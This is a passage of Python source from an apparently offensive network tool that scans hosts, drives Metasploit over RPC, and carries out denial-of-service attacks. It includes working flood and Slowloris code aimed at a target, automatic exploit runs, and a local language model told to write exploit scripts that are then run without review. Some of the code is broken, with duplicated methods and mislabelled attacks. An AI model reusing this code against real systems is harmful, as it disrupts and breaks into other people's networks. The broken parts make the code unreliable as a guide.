            self._discover_network()
    
    def _discover_network(self):
        """Discover network and hosts if auto-discovery is enabled."""
        self.logger.info("Starting network discovery...")
        self.viewer.status("Discovering network hosts...")
        
        # Create network discovery object
        discovery = NetworkDiscovery(
            interface=self.interface,
            network=self.network,
            timeout=self.host_timeout
        )
        
        # Get network CIDR
        network = discovery.get_network_cidr()
        self.logger.info(f"Network: {network}")
        
        # Discover hosts
        animation = self.viewer.scanning_animation("Discovering live hosts")
        try:
            self.discovered_hosts = discovery.discover_hosts()
            
            # Wait for discovery to complete
            animation.set()
            
            if not self.discovered_hosts:
                self.logger.warning("No live hosts discovered in the network")
                self.viewer.warning("No live hosts discovered")
            else:
                self.logger.info(f"Discovered {len(self.discovered_hosts)} hosts: {', '.join(self.discovered_hosts)}")
                self.viewer.success(f"Discovered {len(self.discovered_hosts)} hosts")
                
                # Set the first host as target if not specified
                if not self.target:
                    self.target = self.discovered_hosts[0]
                    self.logger.info(f"Setting first discovered host as target: {self.target}")
                    self.viewer.status(f"Setting target to {self.target}")
                
                # If scan_all is enabled, we'll cycle through all hosts
                if self.scan_all:
                    self.logger.info(f"Will scan all {len(self.discovered_hosts)} discovered hosts")
                    self.viewer.status(f"Will scan all {len(self.discovered_hosts)} discovered hosts")
                    
                    # Initialize current target index
                    if self.target in self.discovered_hosts:
                        self.current_target_index = self.discovered_hosts.index(self.target)
                    else:
                        self.current_target_index = 0
                        self.target = self.discovered_hosts[0]
        except Exception as e:
            animation.set()
            self.logger.error(f"Error during network discovery: {e}")
            self.viewer.error(f"Network discovery failed: {str(e)}")
    
    def next_target(self) -> bool:
        """Move to the next target in the discovered hosts list.
        
        Returns:
            bool: True if there's a new target, False if we've scanned all hosts
        """
        if not self.scan_all or not self.discovered_hosts:
            return False
        
        self.current_target_index += 1
        
        # Check if we've scanned all hosts
        if self.current_target_index >= len(self.discovered_hosts):
            self.logger.info("All discovered hosts have been scanned")
            return False
        
        # Set the new target
        self.target = self.discovered_hosts[self.current_target_index]
        self.logger.info(f"Moving to next target: {self.target}")
        self.viewer.status(f"Moving to next target: {self.target}")
        
        return True
    
    def _signal_handler(self, sig, frame):
        """Handle termination signals gracefully."""
        self.logger.info("Received interrupt signal, shutting down gracefully...")
        self.viewer.warning("Interrupt received, shutting down gracefully...")
        self.running = False

    # Metasploit integration methods
    def setup_metasploit(self):
        """Set up connection to Metasploit RPC server."""
        if not self.msf_integration:
            return False
            
        try:
            self.logger.info("Setting up Metasploit RPC connection...")
            self.viewer.status("Connecting to Metasploit RPC server...")
            
            # Default Metasploit RPC settings
            password = "msf_password"  # Default password used in setup
            host = "127.0.0.1"
            port = 55553
            
            # Try to connect to Metasploit RPC
            try:
                self.msf_client = MsfRpcClient(
                    password,
                    server=host,
                    port=port,
                    ssl=False
                )
                
                # Check connection
                if self.msf_client.call('core.version')['version']:
                    self.msf_connected = True
                    self.logger.info("Successfully connected to Metasploit RPC")
                    
                    # Set up workspace
                    self._setup_msf_workspace()
                    
                    return True
            except Exception as e:
                self.logger.error(f"Error connecting to Metasploit RPC: {e}")
                
                # Try to start msfrpcd if it's not running
                self._start_msfrpcd(password, host, port)
                
                # Try connecting again
                try:
                    self.msf_client = MsfRpcClient(
                        password,
                        server=host,
                        port=port,
                        ssl=False
                    )
                    
                    # Check connection
                    if self.msf_client.call('core.version')['version']:
                        self.msf_connected = True
                        self.logger.info("Successfully connected to Metasploit RPC")
                        
                        # Set up workspace
                        self._setup_msf_workspace()
                        
                        return True
                except Exception as e2:
                    self.logger.error(f"Failed to connect to Metasploit RPC after starting msfrpcd: {e2}")
            
            # If we got here, we couldn't connect
            self.viewer.error("Failed to connect to Metasploit RPC")
            self.viewer.warning("Metasploit integration will be disabled")
            self.msf_integration = False
            return False
            
        except Exception as e:
            self.logger.error(f"Error setting up Metasploit: {e}")
            self.viewer.error(f"Error setting up Metasploit: {str(e)}")
            self.msf_integration = False
            return False
    
    def _start_msfrpcd(self, password, host, port):
        """Try to start the Metasploit RPC daemon."""
        self.logger.info("Attempting to start Metasploit RPC daemon...")
        
        try:
            # Check if msfrpcd is running using ps
            ps_output = subprocess.check_output(["ps", "aux"], universal_newlines=True)
            if f"msfrpcd -P {password}" in ps_output:
                self.logger.info("msfrpcd already running")
                return
                
            # Try to start msfrpcd
            cmd = [
                "msfrpcd",
                "-P", password,
                "-S",  # No SSL
                "-a", host,
                "-p", str(port)
            ]
            
            # Start msfrpcd in the background
            self.logger.info(f"Starting msfrpcd: {' '.join(cmd)}")
            subprocess.Popen(
                cmd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                start_new_session=True
            )
            
            # Give it time to start
            self.logger.info("Waiting for msfrpcd to start...")
            time.sleep(5)
            
        except Exception as e:
            self.logger.error(f"Error starting msfrpcd: {e}")
            
            # Try alternative - using systemctl
            try:
                self.logger.info("Trying to start msfrpcd using systemctl...")
                subprocess.run(
                    ["systemctl", "start", "msfrpcd"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                        check=True
                    )
                time.sleep(5)
            except Exception as e2:
                self.logger.error(f"Error starting msfrpcd using systemctl: {e2}")
    
    def _setup_msf_workspace(self):
        """Set up Metasploit workspace."""
        if not self.msf_connected or not self.msf_client:
            return
            
        try:
            # Get list of workspaces
            workspaces = self.msf_client.call('db.workspaces')
            
            # Check if our workspace exists
            workspace_exists = False
            for ws in workspaces['workspaces']:
                if ws['name'] == self.msf_workspace:
                    workspace_exists = True
                    break
            
            # Create workspace if it doesn't exist
            if not workspace_exists:
                self.logger.info(f"Creating Metasploit workspace: {self.msf_workspace}")
                self.msf_client.call('db.add_workspace', [self.msf_workspace])
            
            # Set current workspace
            self.logger.info(f"Setting Metasploit workspace to: {self.msf_workspace}")
            self.msf_client.call('db.set_workspace', [self.msf_workspace])
            
        except Exception as e:
            self.logger.error(f"Error setting up Metasploit workspace: {e}")
    
    def process_results_with_metasploit(self, result):
        """Process scan results with Metasploit to import hosts and services."""
        if not self.msf_connected or not self.msf_client or not result:
            return
            
        try:
            self.logger.info("Processing scan results with Metasploit...")
            
            # Check if target is in scan results
            if 'scan' not in result or self.target not in result['scan']:
                self.logger.warning(f"Target {self.target} not found in scan results")
                return
                
            target_info = result['scan'][self.target]
            
            # Import host
            host_data = {
                'host': self.target,
                'state': 'alive',
                'name': '',
                'os_name': '',
                'os_flavor': '',
                'os_sp': '',
                'os_lang': '',
                'arch': '',
                'mac': '',
                'scope': self.msf_workspace
            }
            
            # Add hostname if available
            if 'hostnames' in target_info and target_info['hostnames']:
                host_data['name'] = target_info['hostnames'][0].get('name', '')
                
            # Add OS info if available
            if 'osmatch' in target_info and target_info['osmatch']:
                os_match = target_info['osmatch'][0]
                host_data['os_name'] = os_match.get('name', '').split()[0]  # Get first word as OS name
                host_data['os_flavor'] = ' '.join(os_match.get('name', '').split()[1:])  # Rest as flavor
                
            # Import the host
            try:
                host_id = self.msf_client.call('db.report_host', [host_data])
                self.logger.debug(f"Imported host {self.target} with ID {host_id}")
            except Exception as e:
                self.logger.error(f"Error importing host to Metasploit: {e}")
            
            # Import services
            for proto in ['tcp', 'udp']:
                if proto in target_info:
                    for port, port_data in target_info[proto].items():
                        if port_data['state'] == 'open':
                            service_data = {
                                'host': self.target,
                                'port': int(port),
                                'proto': proto,
                                'state': 'open',
                                'name': port_data.get('name', ''),
                                'info': '',
                            }
                            
                            # Add version info if available
                            if 'product' in port_data and port_data['product']:
                                service_info = port_data['product']
                                if 'version' in port_data and port_data['version']:
                                    service_info += f" {port_data['version']}"
                                service_data['info'] = service_info
                            
                            # Import the service
                            try:
                                service_id = self.msf_client.call('db.report_service', [service_data])
                                self.logger.debug(f"Imported service {port}/{proto} on {self.target} with ID {service_id}")
                            except Exception as e:
                                self.logger.error(f"Error importing service to Metasploit: {e}")
            
            self.logger.info("Successfully imported scan results to Metasploit")
            
            # Run exploits if enabled
            if self.exploit:
                self.find_matching_exploits()
                
        except Exception as e:
            self.logger.error(f"Error processing results with Metasploit: {e}")
    
    def find_matching_exploits(self):
        """Find matching exploits for the target's open services."""
        if not self.msf_connected or not self.msf_client:
            return
            
        try:
            self.logger.info(f"Finding matching exploits for {self.target}...")
            self.viewer.status(f"Finding matching exploits for {self.target}...")
            
            # Get host services
            services = self.msf_client.call('db.services', [{'workspace': self.msf_workspace, 'host': self.target}])
            
            # Check if we have services
            if not services or 'services' not in services or not services['services']:
                self.logger.warning(f"No services found for {self.target}")
                return
                
            # Extract service information
            target_services = []
            for service in services['services']:
                if service['state'] == 'open':
                    service_info = {
                        'port': service['port'],
                        'proto': service['proto'],
                        'name': service['name'],
                        'info': service['info']
                    }
                    target_services.append(service_info)
            
            self.logger.info(f"Found {len(target_services)} open services on {self.target}")
            
            # If we should automatically run exploits
            if self.exploit:
                self.run_exploits_on_host(self.target)
            else:
                # Generate a Metasploit resource script
                script_path = self.generate_resource_script()
                
                if script_path:
                    self.viewer.script_generation_summary(
                        script_path,
                        "Metasploit Resource Script",
                        f"Resource script for exploiting {self.target}"
                    )
                    
                    # Run the script if execute_scripts is enabled
                    if self.execute_scripts:
                        result = self.run_resource_script(script_path)
                        if result:
                            self.viewer.success(f"Successfully executed resource script: {script_path}")
                        else:
                            self.viewer.warning(f"Failed to execute resource script: {script_path}")
        except Exception as e:
            self.logger.error(f"Error finding matching exploits: {e}")
    
    def generate_resource_script(self):
        """Generate a Metasploit resource script for the target."""
        if not self.msf_connected or not self.msf_client:
            return None
            
        try:
            self.logger.info(f"Generating Metasploit resource script for {self.target}...")
            
            # Get host services
            services = self.msf_client.call('db.services', [{'workspace': self.msf_workspace, 'host': self.target}])
            
            # Check if we have services
            if not services or 'services' not in services or not services['services']:
                self.logger.warning(f"No services found for {self.target}")
                return None
                
            # Create script directory if it doesn't exist
            script_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "generated_scripts")
            os.makedirs(script_dir, exist_ok=True)
            
            # Generate script filename
            timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
            script_path = os.path.join(script_dir, f"metasploit_{self.target.replace('.', '_')}_{timestamp}.rc")
            
            # Get local IP to use for payload
            local_ip = self._get_local_ip()
            
            # Generate resource script content
            content = [
                f"# Metasploit resource script for {self.target}",
                f"# Generated on {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                "",
                f"workspace {self.msf_workspace}",
                "",
                "# Set global variables",
                f"setg RHOSTS {self.target}",
                f"setg LHOST {local_ip}",
                "setg LPORT 4444",
                "",
                "# Scan modules"
            ]
            
            # Add scan modules
            for service in services['services']:
                if service['state'] == 'open':
                    port = service['port']
                    proto = service['proto']
                    name = service['name']
                    
                    content.append(f"# Port {port}/{proto} - {name}")
                    
                    # Add scanner modules based on service
                    if name == 'ssh':
                        content.append(f"use auxiliary/scanner/ssh/ssh_version")
                        content.append(f"set RHOSTS {self.target}")
                        content.append(f"set RPORT {port}")
                        content.append("run")
                    elif name == 'http' or name == 'https':
                        content.append(f"use auxiliary/scanner/http/http_version")
                        content.append(f"set RHOSTS {self.target}")
                        content.append(f"set RPORT {port}")
                        content.append("run")
                    elif name == 'smb' or name == 'microsoft-ds':
                        content.append(f"use auxiliary/scanner/smb/smb_version")
                        content.append(f"set RHOSTS {self.target}")
                        content.append(f"set RPORT {port}")
                        content.append("run")
                    elif name == 'ftp':
                        content.append(f"use auxiliary/scanner/ftp/ftp_version")
                        content.append(f"set RHOSTS {self.target}")
                        content.append(f"set RPORT {port}")
                        content.append("run")
                    
                    content.append("")
            
            # Add exploit modules section
            content.append("# Exploit modules")
            
            # Add resource script footer
            content.append("")
            content.append("# End of resource script")
            
            # Write to file
            with open(script_path, "w") as f:
                f.write("\n".join(content))
                
            self.logger.info(f"Generated resource script: {script_path}")
            return script_path
            
        except Exception as e:
            self.logger.error(f"Error generating resource script: {e}")
            return None
    
    def run_resource_script(self, script_path):
        """Run a Metasploit resource script."""
        if not os.path.exists(script_path):
            self.logger.error(f"Resource script not found: {script_path}")
            return False
            
        try:
            self.logger.info(f"Running resource script: {script_path}")
            self.viewer.status(f"Running Metasploit resource script: {os.path.basename(script_path)}")
            
            # Run msfconsole with resource script
            cmd = [
                "msfconsole",
                "-q",  # Quiet mode
                "-r", script_path
            ]
            
            # Execute the command
            self.logger.debug(f"Executing: {' '.join(cmd)}")
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            # Process output
            output, error = process.communicate()
            
            # Log results
            if process.returncode == 0:
                self.logger.info(f"Resource script executed successfully")
                if self.debug:
                    self.logger.debug(f"Output: {output}")
                return True
            else:
                self.logger.error(f"Resource script execution failed: {error}")
                return False
                
        except Exception as e:
            self.logger.error(f"Error running resource script: {e}")
            return False
    
    def run_exploits_on_host(self, target):
        """Run exploits on the target host."""
        if not self.msf_connected or not self.msf_client:
            return
            
        try:
            self.logger.info(f"Running exploits on {target}...")
            self.viewer.status(f"Running exploits on {target}...")
            
            # Generate and run a resource script
            script_path = self.generate_resource_script()
            
            if script_path:
                result = self.run_resource_script(script_path)
                
                # Display result
                if result:
                    self.viewer.success(f"Completed exploit attempts on {target}")
                else:
                    self.viewer.warning(f"Exploit attempts on {target} may have failed")
            
        except Exception as e:
            self.logger.error(f"Error running exploits: {e}")
    
    def _get_local_ip(self):
        """Get the local IP address to use for callbacks."""
        try:
            # Get all interfaces
            interfaces = []
            for iface in netifaces.interfaces():
                # Skip loopback interfaces
                if iface.startswith('lo') or iface == 'lo':
                    continue
                    
                # Get addresses for interface
                addresses = netifaces.ifaddresses(iface)
                
                # Get IPv4 addresses
                if netifaces.AF_INET in addresses:
                    for addr in addresses[netifaces.AF_INET]:
                        ip = addr.get('addr')
                        if ip and ip != '127.0.0.1':
                            interfaces.append((iface, ip))
            
            # Get the IP of the interface we're using if specified
            if self.interface:
                for iface, ip in interfaces:
                    if iface == self.interface:
                        return ip
            
            # Otherwise, use the first non-virtual interface
            for iface, ip in interfaces:
                name = iface.lower()
                # Skip virtual interfaces
                if 'veth' in name or 'docker' in name or 'vmnet' in name or 'vbox' in name:
                    continue
                return ip
            
            # If no suitable interface found, use the first available
            if interfaces:
                return interfaces[0][1]
            
            # Default to localhost if nothing else works
            return "127.0.0.1"
            
        except Exception as e:
            self.logger.error(f"Error getting local IP: {e}")
            return "127.0.0.1"

    # DoS attack methods
    def perform_dos_attack(self, target):
        """Perform a DoS attack against the target."""
        try:
            self.logger.info(f"Starting DoS attack against {target} using method: {self.dos_method}")
            
            # Map attack methods to their implementations
            attack_methods = {
                'udp': self._udp_flood_attack,
                'icmp': self._icmp_flood_attack,
                'slowloris': self._slowloris_attack,
                'syn': self._syn_flood_attack,
                'http': self._http_flood_attack,
                'cpu': self._cpu_exhaustion_attack,
                'memory': self._memory_exhaustion_attack,
                'disk': self._disk_exhaustion_attack,
                'http2': self._http2_dos_attack,
                'dns': self._dns_amplification_attack,
                'slowpost': self._slowpost_attack,
                'dbpool': self._dbpool_exhaustion_attack,
                'cache': self._cache_poisoning_attack,
                'bgp': self._bgp_route_poisoning_attack,
                'arp': self._arp_cache_poisoning_attack,
                'vlan': self._vlan_hopping_attack
            }
            
            # Get the attack method
            attack_method = attack_methods.get(self.dos_method.lower())
            if not attack_method:
                self.logger.error(f"Unknown DoS attack method: {self.dos_method}")
                return False
                
            # Perform the attack
            success = attack_method(target)
            
            if success:
                self.logger.info(f"DoS attack completed successfully against {target}")
            else:
                self.logger.error(f"DoS attack failed against {target}")
                
            return success
            
        except Exception as e:
            self.logger.error(f"Error in DoS attack: {e}")
            return False
    
    def _udp_flood_attack(self, target):
        """Perform a UDP flood attack."""
        try:
            import socket
            import threading
            import time
            
            def flood():
                while time.time() < end_time:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        sock.sendto(self.dos_payload.encode(), (target, 80))
                        sock.close()
                    except:
                        pass
                        
            # Start attack threads
            end_time = time.time() + self.dos_duration
            threads = []
            for _ in range(self.dos_threads):
                thread = threading.Thread(target=flood)
                thread.daemon = True
                thread.start()
                threads.append(thread)
                
            # Wait for all threads to complete
            for thread in threads:
                thread.join()
                
            return True
            
        except Exception as e:
            self.logger.error(f"Error in UDP flood attack: {e}")
            return False
            
    def _icmp_flood_attack(self, target):
        """Perform an ICMP flood attack."""
        try:
            import socket
            import threading
            import time
            
            def flood():
                while time.time() < end_time:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.connect((target, 80))
                        sock.send(self.dos_payload.encode())
                        sock.close()
                    except:
                        pass
                        
            # Start attack threads
            end_time = time.time() + self.dos_duration
            threads = []
            for _ in range(self.dos_threads):
                thread = threading.Thread(target=flood)
                thread.daemon = True
                thread.start()
                threads.append(thread)
                
            # Wait for all threads to complete
            for thread in threads:
                thread.join()
                
            return True
            
        except Exception as e:
            self.logger.error(f"Error in ICMP flood attack: {e}")
            return False
            
    def _slowloris_attack(self, target):
        """Perform a Slowloris attack."""
        try:
            import socket
            import threading
            import time
            
            def slowloris():
                while time.time() < end_time:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.connect((target, 80))
                        sock.send("GET / HTTP/1.1\r\n".encode())
                        sock.send(f"Host: {target}\r\n".encode())
                        sock.send("User-Agent: Mozilla/5.0\r\n".encode())
                        sock.send("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n".encode())
                        sock.send("Accept-Language: en-us,en;q=0.5\r\n".encode())
                        sock.send("Accept-Encoding: gzip,deflate\r\n".encode())
                        sock.send("Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n".encode())
                        sock.send("Keep-Alive: 115\r\n".encode())
                        sock.send("Connection: keep-alive\r\n".encode())
                        sock.send("X-Forwarded-For: 127.0.0.1\r\n".encode())
                        sock.send("Content-Length: 42\r\n".encode())
                        sock.send("\r\n".encode())
                        connections.append(sock)
                    except:
                        pass
                        
            # Start attack threads
            end_time = time.time() + self.dos_duration
            connections = []
            threads = []
            for _ in range(self.dos_threads):
                thread = threading.Thread(target=slowloris)
                thread.daemon = True
                thread.start()
                threads.append(thread)
                
            # Wait for all threads to complete
            for thread in threads:
                thread.join()
                
            # Close all connections
            for sock in connections:
                try:
                    sock.close()
                except:
                    pass
                    
            return True
            
        except Exception as e:
            self.logger.error(f"Error in Slowloris attack: {e}")
            return False
            
    def _syn_flood_attack(self, target):
        """Perform a SYN flood attack."""
        try:
            import socket
            import threading
            import time
            
            def flood():
                while time.time() < end_time:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.1)
                        sock.connect((target, 80))
                        sock.close()
                    except:
                        pass
                        
            # Start attack threads
            end_time = time.time() + self.dos_duration
            threads = []
            for _ in range(self.dos_threads):
                thread = threading.Thread(target=flood)
                thread.daemon = True
                thread.start()
                threads.append(thread)
                
            # Wait for all threads to complete
            for thread in threads:
                thread.join()
                
            return True
            
        except Exception as e:
            self.logger.error(f"Error in SYN flood attack: {e}")
            return False
            
    def _http_flood_attack(self, target):
        """Perform an HTTP flood attack."""
        try:
            import requests
            import threading
            import time
            
            def flood():
                while time.time() < end_time:
                    try:
                        requests.get(f"http://{target}/", headers={
                            "User-Agent": "Mozilla/5.0",
                            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                            "Accept-Language": "en-us,en;q=0.5",
                            "Accept-Encoding": "gzip,deflate",
                            "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
                            "Keep-Alive": "115",
                            "Connection": "keep-alive",
                            "X-Forwarded-For": "127.0.0.1"
                        })
                    except:
                        pass
                        
            # Start attack threads
            end_time = time.time() + self.dos_duration
            threads = []
            for _ in range(self.dos_threads):
                thread = threading.Thread(target=flood)
                thread.daemon = True
                thread.start()
                threads.append(thread)
                
            # Wait for all threads to complete
            for thread in threads:
                thread.join()
                
            return True
            
        except Exception as e:
            self.logger.error(f"Error in HTTP flood attack: {e}")
            return False
    
    def _generic_flood_attack(self, target, ports):
        """Perform a generic network flood attack."""
        try:
            self.logger.info(f"Performing generic flood attack on {target}...")
            
            # Choose a random port if available, otherwise use port 80
            port = random.choice(ports) if ports else 80
            
            # Use ping flood as a simple generic attack
            cmd = [
                "ping",
                "-f",  # Flood
                "-c", "1000",  # 1000 packets
                target
            ]
            
            # Execute attack
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            # Wait for it to complete
            output, error = process.communicate()
            
            if process.returncode == 0:
                self.logger.info(f"Generic flood attack completed on {target}")
                return True
            else:
                self.logger.error(f"Generic flood attack failed: {error}")
                return False
                
        except Exception as e:
            self.logger.error(f"Error performing generic flood attack: {e}")
            return False
    
    def _udp_flood_attack(self, target):
        """Perform a UDP flood attack."""
        try:
            script = f"""
import socket
import threading
import time

def udp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        sock.sendto(b"X" * 1024, ("{target}", 80))

threads = []
for _ in range({self.dos_threads}):
    t = threading.Thread(target=udp_flood)
    t.daemon = True
    t.start()
    threads.append(t)

time.sleep({self.dos_duration})
"""
            return self.execute_generated_script(script)
        except Exception as e:
            self.logger.error(f"Error in UDP flood attack: {e}")
            return False
            
    def _icmp_flood_attack(self, target):
        """Perform an ICMP flood attack."""
        try:
            script = f"""
import socket
import threading
import time

def icmp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            sock.connect(("{target}", 80))
        except:
            pass

threads = []
for _ in range({self.dos_threads}):
    t = threading.Thread(target=icmp_flood)
    t.daemon = True
    t.start()
    threads.append(t)

time.sleep({self.dos_duration})
"""
            return self.execute_generated_script(script)
        except Exception as e:
            self.logger.error(f"Error in ICMP flood attack: {e}")
            return False
            
    def _slowloris_attack(self, target):
        """Perform a Slowloris attack."""
        try:
            script = f"""
import socket
import threading
import time

def slowloris():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(("{target}", 80))
            sock.send("GET / HTTP/1.1\\r\\n")
            sock.send("Host: {target}\\r\\n")
            sock.send("User-Agent: Mozilla/5.0\\r\\n")
            sock.send("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n")
            sock.send("Accept-Language: en-us,en;q=0.5\\r\\n")
            sock.send("Accept-Encoding: gzip,deflate\\r\\n")
            sock.send("Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\\r\\n")
            sock.send("Keep-Alive: 115\\r\\n")
            sock.send("Connection: keep-alive\\r\\n")
        except:
            pass

threads = []
for _ in range({self.dos_threads}):
    t = threading.Thread(target=slowloris)
    t.daemon = True
    t.start()
    threads.append(t)

time.sleep({self.dos_duration})
"""
            return self.execute_generated_script(script)
        except Exception as e:
            self.logger.error(f"Error in Slowloris attack: {e}")
            return False
    
    # Script generation and execution methods
    def generate_custom_script(self, script_type="bash", target_info=None):
        """Generate a custom script for the target based on scan results."""
        try:
            self.logger.info(f"Generating custom {script_type} script for {self.target}...")
            self.viewer.status(f"Generating custom {script_type} script...")
            
            # Use target info if provided, otherwise get open ports from history
            if not target_info:
                open_ports = self.get_open_ports_from_history()
                target_info = {
                    'target': self.target,
                    'open_ports': open_ports
                }
            
            # Create script directory if it doesn't exist
            script_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "generated_scripts")
            os.makedirs(script_dir, exist_ok=True)
            
            # Generate script filename
            timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
            script_filename = f"{self.target.replace('.', '_')}_{timestamp}.{self._get_script_extension(script_type)}"
            script_path = os.path.join(script_dir, script_filename)
            
            # Prepare context for the LLM
            context = self.prepare_ollama_context()
            
            # Construct the prompt for the LLM
            prompt = f"""Generate a {script_type} script to interact with or exploit the target system at {self.target}.

Target Information:
- IP Address: {self.target}
- Open Ports: {target_info.get('open_ports', [])}

Requirements:
- The script should be written in {script_type}
- It should perform reconnaissance on the open ports
- Include error handling and proper exit codes
- Add helpful comments explaining what each section does
- The script must be ethical and non-destructive

Script Template Format:
```{script_type}
#!/bin/bash  # Or appropriate shebang
# Script title
# Description
# Usage instructions

# Main code here
```

Please generate a complete, executable {script_type} script:"""

            # Call Ollama to generate the script
            self.logger.info(f"Asking Ollama to generate a {script_type} script...")
            response = self.call_ollama(prompt)
            
            if not response:
                self.logger.error("Failed to get response from Ollama")
                # Generate a fallback script without LLM
                script_content = self._generate_fallback_script(script_type, target_info)
            else:
                # Extract the script from the response
                script_content = self._extract_script_from_response(response, script_type)
            
            # Write the script to file
            with open(script_path, "w") as f:
                f.write(script_content)
            
            # Make the script executable
            os.chmod(script_path, os.stat(script_path).st_mode | stat.S_IEXEC)
            
            self.logger.info(f"Generated {script_type} script: {script_path}")
            self.viewer.script_generation_summary(
                script_path,
                script_type.upper(),
                f"Custom script for reconnaissance of {self.target}"
            )
            
            # Execute the script if requested
            if self.execute_scripts:
                self.execute_generated_script(script_path)
            
            return script_path
            
        except Exception as e:
            self.logger.error(f"Error generating custom script: {e}")
            self.self.logger.info("Script generation failed: {str(e)}")
            return None
    
    def _extract_script_from_response(self, response, script_type):
        """Extract the script from the LLM response."""
        try:
            # Regular expression to extract code blocks
            code_block_pattern = r"```(?:" + script_type + r"|shell|bash)?(.+?)```"
            code_blocks = re.findall(code_block_pattern, response, re.DOTALL)
            
            if code_blocks:
                # Use the first code block
                return code_blocks[0].strip()
            else:
                # If no code blocks found, just use the whole response
                return response.strip()
                
        except Exception as e:
            self.logger.error(f"Error extracting script from response: {e}")
            return response.strip()
    
    def _generate_fallback_script(self, script_type, target_info):
        """Generate a fallback script without using the LLM."""
        target = target_info.get('target', self.target)
        open_ports = target_info.get('open_ports', [])
        
        if script_type.lower() == "bash" or script_type.lower() == "shell":
            return self._generate_fallback_bash_script(target, open_ports)
        elif script_type.lower() == "python":
            return self._generate_fallback_python_script(target, open_ports)
        else:
            # Default to bash
            return self._generate_fallback_bash_script(target, open_ports)
    
    def _generate_fallback_bash_script(self, target, open_ports):
        """Generate a fallback bash script."""
        script = f"""#!/bin/bash
# Reconnaissance Script for {target}
# Generated on {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
# This script performs basic reconnaissance on a target system

TARGET="{target}"
OPEN_PORTS=({' '.join(str(port) for port in open_ports)})

echo "Starting reconnaissance on $TARGET"
echo "Open ports: ${{OPEN_PORTS[@]}}"

# Ping the target
echo "Checking if host is up..."
ping -c 3 $TARGET

# Check each open port
for PORT in "${{OPEN_PORTS[@]}}"; do
  echo "Checking port $PORT..."
  
  case $PORT in
    21)
      echo "FTP port detected, checking banner..."
      echo -e "\\n" | nc -w 5 $TARGET $PORT
      ;;
    22)
      echo "SSH port detected, checking banner..."
      echo -e "\\n" | nc -w 5 $TARGET $PORT
      ;;
    80|443)
      echo "Web port detected, checking headers..."
      curl -s -I http://$TARGET:$PORT
      ;;
    *)
      echo "Generic port check..."
      nc -z -w 5 $TARGET $PORT && echo "Port $PORT is open" || echo "Port $PORT is closed"
      ;;
  esac
done

echo "Reconnaissance completed"
"""
        return script
    
    def _generate_fallback_python_script(self, target, open_ports):
        """Generate a fallback Python script."""
        script = f"""#!/usr/bin/env python3
# Reconnaissance Script for {target}
# Generated on {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
# This script performs basic reconnaissance on the target system

import socket
import subprocess
import sys
import os

TARGET = "{target}"
OPEN_PORTS = {open_ports}

def main():
    print(f"Starting reconnaissance on {{TARGET}}")
    print(f"Open ports: {{OPEN_PORTS}}")
    
    # Ping the target
    print("Checking if host is up...")
    try:
        subprocess.run(["ping", "-c", "3", TARGET], check=True)
    except subprocess.CalledProcessError:
        print(f"Host {{TARGET}} appears to be down")
    
    # Check each open port
    for port in OPEN_PORTS:
        print(f"Checking port {{port}}...")
        
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(5)
                result = s.connect_ex((TARGET, port))
                if result == 0:
                    print(f"Port {{port}} is open")
                else:
                    print(f"Port {{port}} is closed")
        except Exception as e:
            print(f"Error checking port {{port}}: {{e}}")
    
    print("Reconnaissance completed")

if __name__ == "__main__":
    main()
"""
        return script
    
    def _get_script_extension(self, script_type):
        """Get the appropriate file extension for the script type."""
        script_type = script_type.lower()
        if script_type == "bash" or script_type == "shell":
            return "sh"
        elif script_type == "python":
            return "py"
        elif script_type == "ruby":
            return "rb"
        elif script_type == "perl":
            return "pl"
        elif script_type == "powershell":
            return "ps1"
        else:
            return "txt"
    
    def execute_generated_script(self, script_path, args=None):
        """Execute a generated script."""
        if not os.path.exists(script_path):
            self.logger.error(f"Script not found: {script_path}")
            return False
            
        try:
            self.logger.info(f"Executing script: {script_path}")
            self.viewer.status(f"Executing script: {os.path.basename(script_path)}")
            
            # Determine script type from extension
            file_ext = os.path.splitext(script_path)[1].lower()
            
            # Build command based on script type
            if file_ext == ".py":
                cmd = ["python3", script_path]
            elif file_ext == ".rb":
                cmd = ["ruby", script_path]
            elif file_ext == ".pl":
                cmd = ["perl", script_path]
            elif file_ext == ".ps1":
                cmd = ["powershell", "-ExecutionPolicy", "Bypass", "-File", script_path]
            else:
                # Default to bash for .sh and unknown extensions
                cmd = ["bash", script_path]
            
            # Add any additional arguments
            if args:
                cmd.extend(args)
            
            # Execute the script
            self.logger.debug(f"Executing: {' '.join(cmd)}")
            
            # Start animation
            animation = self.viewer.scanning_animation(f"Running {os.path.basename(script_path)}")
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
